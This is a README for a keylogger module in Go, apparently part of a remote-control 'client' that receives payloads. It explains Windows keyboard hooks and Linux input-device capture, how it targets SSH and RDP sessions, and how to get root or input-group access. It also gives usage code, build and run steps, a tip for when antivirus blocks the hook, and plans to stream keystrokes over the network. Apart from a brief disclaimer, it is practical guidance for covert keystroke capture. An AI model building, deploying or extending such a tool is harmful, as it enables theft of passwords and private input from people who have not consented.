# Keylogger Implementation

## Overview

The keylogger has been fully implemented with platform-specific low-level keyboard monitoring for Windows, Linux, and macOS. It supports monitoring SSH sessions, RDP sessions, and general keyboard input.

## Platform-Specific Implementations

### Windows (`keylogger_windows.go`)
- **Technology**: Windows API `SetWindowsHookEx` with `WH_KEYBOARD_LL`
- **Features**:
  - Low-level keyboard hook that captures all keyboard input
  - Works in both console sessions and RDP sessions
  - Converts virtual key codes to readable characters
  - Supports special keys (Ctrl, Alt, F-keys, etc.)
- **Requirements**: None (uses syscall)
- **Permissions**: Administrator privileges may be required

### Linux/Unix (`keylogger_linux.go`)
- **Technology**: `/dev/input/event*` device monitoring
- **Features**:
  - Direct access to Linux input subsystem
  - Monitors all keyboard devices automatically
  - Converts Linux key codes to readable characters
  - SSH session monitoring via `/var/log/auth.log`
- **Requirements**: None (uses syscall and standard library)
- **Permissions**: 
  - Root access OR
  - User must be in `input` group: `sudo usermod -a -G input $USER`
  - Access to `/dev/input/event*` devices

## Supported Targets

The keylogger supports three monitoring targets:

1. **`ssh`**: Monitor SSH sessions
   - Windows: Uses keyboard hooks
   - Linux/Unix: Monitors `/var/log/auth.log` + keyboard input

2. **`rdp`**: Monitor RDP/remote desktop sessions
   - Windows: Low-level keyboard hook works in RDP sessions
   - Linux/Unix: Works with xrdp sessions

3. **`monitor`** or **`general`**: General keyboard monitoring
   - All platforms: Captures all keyboard input system-wide

## Usage

```go
kl := NewKeylogger()

// Start monitoring with a specific target
payload := &common.KeyloggerPayload{
    Target:   "rdp",           // "ssh", "rdp", or "monitor"
    SavePath: "/tmp/keys.log", // Optional: save to file
}

err := kl.Start(payload)
if err != nil {
    log.Fatal(err)
}

// Get captured data
data := kl.GetData()
if data != nil {
    fmt.Printf("Keys: %s\n", data.Keys)
}

// Stop monitoring
kl.Stop()
```

## Building

### Windows and Linux
```bash
go build ./client
```

### Cross-compilation
The implementation uses build tags to compile the correct version for each platform automatically:
- `keylogger_windows.go` - Compiled only on Windows
- `keylogger_linux.go` - Compiled only on Linux/Unix

## Security Considerations

⚠️ **Warning**: This keylogger is designed for legitimate system monitoring and security purposes only.

- **Legal**: Ensure you have proper authorization before deploying
- **Privacy**: Keyboard data can contain sensitive information
- **Storage**: Log files should be encrypted and access-controlled
- **Compliance**: Follow applicable privacy laws and regulations

## Technical Details

### Key Features
- Platform-specific implementations using native APIs
- Real-time keyboard capture
- Special key detection (Ctrl, Alt, F-keys, etc.)
- UTF-8 support for international keyboards (Windows/macOS)
- Buffered data channel (100 keys)
- File logging with timestamps
- Thread-safe operation

### Performance
- Minimal CPU overhead (event-driven)
- Low memory footprint
- No external dependencies

### Limitations
- **Linux**: Requires device permissions or root access
- **Windows**: May require administrator privileges
- **All**: Cannot capture secure input fields (by OS design)

## Files

- `keylogger.go` - Main keylogger interface and common functionality
- `keylogger_windows.go` - Windows implementation
- `keylogger_linux.go` - Linux/Unix implementation

## Testing

### Windows
```powershell
# Run as Administrator
.\client.exe
```

### Linux
```bash
# Option 1: Run as root
sudo ./client

# Option 2: Add user to input group (recommended)
sudo usermod -a -G input $USER
# Log out and log back in
./client
```

## Troubleshooting

### Linux: "Permission denied" on `/dev/input/event*`
```bash
# Check current permissions
ls -l /dev/input/event*

# Add user to input group
sudo usermod -a -G input $USER

# Or run as root
sudo ./client
```

### Windows: Hook not working
- Run as Administrator
- Check if antivirus is blocking the hook
- Ensure no other keyboard hook is interfering

## Future Enhancements

- Multi-monitor support for screenshots
- Encrypted log storage
- Network streaming of keyboard data
- Session replay functionality
- Integration with SIEM systems
